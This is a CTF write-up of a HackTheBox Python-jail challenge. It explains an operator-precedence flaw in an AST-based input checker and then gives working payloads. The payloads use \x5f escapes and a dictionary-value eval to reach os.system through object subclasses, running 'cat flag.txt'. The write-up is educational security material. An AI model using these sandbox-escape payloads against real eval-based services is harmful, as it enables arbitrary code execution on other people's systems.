# HackTheBox University Qualifiers - Misc - Tree of Danger!

## Bypass a custom python jail that uses AST for sanitization

As you approach SafetyCorp's headquarters, you come across an enormous cogwork tree, and as you watch, a mechanical snake slithers out of a valve, inspecting you carefully. Can you build a disguise, and slip past it?

## A quick note

My team Knightsec was the first to blood this challenge, part of a growing trend of enjoying python jails. This writeup makes use of many of the techniques discussed in my writeup for a [previous hackthebox CTF](https://github.com/BeesAreCool/ctf-writeups/blob/main/writeups/cyberapocalypse_build_yourself_in.md); however, this challenge has the additional feature of AST sanitization.

## Triage


After downloading the python script I need to escape from I identify the main flow of the program.

```python
print("Welcome to SafetyCalc (tm)!\n"
      "Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc")
while True:
    ex = input("> ")
    if is_safe(ex):
        try:
            print(eval(ex, {'math': math}, {}))
        except Exception as e:
            print(f"Something bad happened! {e}")
    else:
        print("Unsafe command detected! The snake approaches...")
        exit(-1)
```

The script will take whatever I input, check if it is safe, and if it is safe run the input in `eval` with access to only the math module. 

Due to quirks of how python is implemented, if we can eval an arbitrary statement we can access any python module through several techniques involving pivoting between different classes and modules. This is a fairly well documented technique and involves going from a basic object to its class definition, and then making use of the parent and child class trees to navigate to a different class. From certain other classes you can get the global variable details from its initializer, which should contain a pointer to a fresh set of python builtins as well as members of other modules in some case. However, first, we need to bypass the is_safe check.

Following is the code relevant to the is_safe function. I'll go through all the functions of note individually.

```python
def is_safe(expr: str) -> bool:
    for bad in ['_']:
        if bad in expr:
            # Just in case!
            return False
    return is_expression_safe(ast.parse(expr, mode='eval').body)
```

This does 2 things. Firstly, it finds the underscore character and removes it. This is very notable as the underscore is a key part of most python jail escapes. The very first step of my usual python jail escape process is to get the class of a tuple by accessing the `__class__` attribute, like `().__class__`. We will need to find a way to bypass the underscore check later on.

Next, it calls the function `is_expression_safe` on a parsed AST of our input. This means python will convert our code into an Abstract Syntax Tree. If you're familiar with compilers, the AST is essentially created to handle syntax parsing. So our code has been converted to an abstract form that can be easily parsed by a machine.

Next, we have the function that runs on the AST to determine if it is safe. I've added several comments to explain what is happening.
```python
def is_expression_safe(node: Union[ast.Expression, ast.AST]) -> bool:
    match type(node):
        case ast.Constant:
            return True # Any constant, so anything that doesn't require code to run to determine its value, is safe. Numbers, strings, etc.
        case ast.List | ast.Tuple | ast.Set:
            return is_sequence_safe(node) # Anything that stores multiple values in a sequence has all of its values checked in is_sequence safe
        case ast.Dict:
            return is_dict_safe(node) # Any dictionary {'key': 'value'} is checked with a custom function.
        case ast.Name:
            return node.id == "math" and isinstance(node.ctx, ast.Load) # The only base variable allowed is math. Additionally, it has to be loaded. This means we can access math but we cannot overwrite its value.
        case ast.UnaryOp:
            return is_expression_safe(node.operand) # a unary operand is something like -x or ~x. We simply run recursively through the elements in the operand, in the example just x.
        case ast.BinOp:
            return is_expression_safe(node.left) and is_expression_safe(node.right) # a binary operand is something like x+y. We simply run recursively through the elements in the operand, in the example both x and y.
        case ast.Call:
            return is_call_safe(node) # if a function call appears, we run a custom function to check the call is safe.
        case ast.Attribute:
            return is_expression_safe(node.value) # If we access an attribute of a value we then check the attribute is safe, recursively, with this very function.
        case _:
            return False
```

Now, you may notice some weird python features with matching. This is a new feature in 3.10 and as far as I can tell is irrelevant to the challenge outside of making you update python. So, lets move on and take a quick look at the 2 additional checking functions and then the final checking function which is vulnerable.

```python
def is_sequence_safe(node: Union[ast.List, ast.Tuple, ast.Set]):
    return all(map(is_expression_safe, node.elts))
```
The check for sequences is very straightforward. Simply go through all the elements `node.elts` of the sequence and check they are all safe.

```python
def is_call_safe(node: ast.Call) -> bool:
    if not is_expression_safe(node.func):
        return False
    if not all(map(is_expression_safe, node.args)):
        return False
    if node.keywords:
        return False
    return True
```

The check for calls is a bit more complicated. Essentially this checks if the function itself is safe, then checks if the arguments and keywords passed are both also safe.

```python
def is_dict_safe(node: ast.Dict) -> bool:
    for k, v in zip(node.keys, node.values):
        if not is_expression_safe(k) and is_expression_safe(v):
            return False
    return True
```

Now, the dictionary check is a bit more unusual. This is actually a fairly subtle order of operations error if you aren't paying that much attention, had the python script been written as `not (is_expression_safe(k) and is_expression_safe(v))` it would be safe. However, it is not. The script wants to do the following check for each element and then saying the dictionary is unsafe if any key value pair returns true, demonstrated with a logical table.

| safe(k)| safe(v)|unsafe|
|--------|--------|------|
|  False |  False |True  |
|  False |  True  |True  |
|  True  |  False |True  |
|  True  |  True  |False |

However, since it left off the parenthesis, it is effectively doing the following instead. This equates to the following statement with paranthesis added for emphases ``(not is_expression_safe(k)) and (is_expression_safe(v))``

| safe(k)| safe(v)|unsafe|
|--------|--------|------|
|  False |  False |False |
|  False |  True  |True  |
|  True  |  False |False |
|  True  |  True  |False |

The big idea is here, is we are allowed to have an unsafe element in a dictionary! We just need to make sure we avoid the combination of an unsafe key with a safe value.

### Attack

Firstly, we can get a quick POC of arbitrary python code execution by trying to run a forbidden function. We can't run `eval` and being able to run eval will help us tremendously, so we try and do that first with the following payload.

```python3
{1: eval('print("I\'m in")')}
```

And we get a succesful print! 


We can now move on to pivoting to bash commands so we can easily locate the flag. The first thing I want to do is dump the complete list of subclasses help by the base object. To do that we need to run `().__class__.__bases__[0].__subclasses__()`. This snippet means
  * Make a tuple
  * Get the class of the tuple (tuple class)
  * Get the base classes of the tuple class
  * Get the first of these base classes (base object class)
  * Get all subclasses, classes that inherit from the base object (everything)

Now, you may remember from earlier that we can't just run this because underscores are blocked. We can trvially get around this by replacing all underscores with an ascii escaped version of them, `\x5f`/ This gives us the following for our next payload.

```python
{1: eval('print(().\x5f\x5fclass\x5f\x5f.\x5f\x5fbases\x5f\x5f[0].\x5f\x5fsubclasses\x5f\x5f())')}
```

This returns a lot...
```
Welcome to SafetyCalc (tm)!
Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc
> {1: eval('print(().\x5f\x5fclass\x5f\x5f.\x5f\x5fbases\x5f\x5f[0].\x5f\x5fsubclasses\x5f\x5f())')}
[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, ........ like hundreds more of these
```
However, we are only interested in the index of `<class 'os._wrap_close'>` on this system. In this case, it appears to be at index 138. This index will change between systems and python versions, so it is worth checking every time. We can now go straight to our final payload.

What we want to do is read flag.txt. While this could be done by just opening it, I find it to be more fun to spawn a shell and run system commands. This makes life easier in many scenarios, for instance when the flag is named weirdly and you need to find it. The following should read the flag.txt file `().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__["system"]("cat flag.txt")`

How it works (extended from earlier)
  * Make a tuple
  * Get the class of the tuple (tuple class)
  * Get the base classes of the tuple class
  * Get the first of these base classes (base object class)
  * Get all subclasses, classes that inherit from the base object (everything)
  * Get the 138th subclass that happens to be os._wrap_close
  * Get the initialization function of os._wrap_close
  * Get the global state that is used by os._wrap_close (includes builtins and the os module
  * Get the system variable from inside the os module (os.system)
  * Call it with our string to cat the flag.
 
When encoded to bypass the underscore and AST checks it looks like the following.

```python
{1: eval('print(().\x5f\x5fclass\x5f\x5f.\x5f\x5fbases\x5f\x5f[0].\x5f\x5fsubclasses\x5f\x5f()[138].\x5f\x5finit\x5f\x5f.\x5f\x5fglobals\x5f\x5f["system"]("cat flag.txt"))')}
```

When running it, we get the flag!

```
Welcome to SafetyCalc (tm)!
Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc
> {1: eval('print(().\x5f\x5fclass\x5f\x5f.\x5f\x5fbases\x5f\x5f[0].\x5f\x5fsubclasses\x5f\x5f()[138].\x5f\x5finit\x5f\x5f.\x5f\x5fglobals\x5f\x5f["system"]("cat flag.txt"))')}
HTB{45ts_4r3_pr3tty_c00l!}0
{1: None}
> 
```

## Post-solve big ideas

If you can get a foothold in python, you can easily pivot to RCE. Because the AST checks were bad for the dictionary we were allowed to have a single unsafe element; however, all child elements of that node on the AST tree could also be unsafe. That let us bypass "bad character" checks and run arbitrary python code, giving us the ability to access the os module and then run bash commands.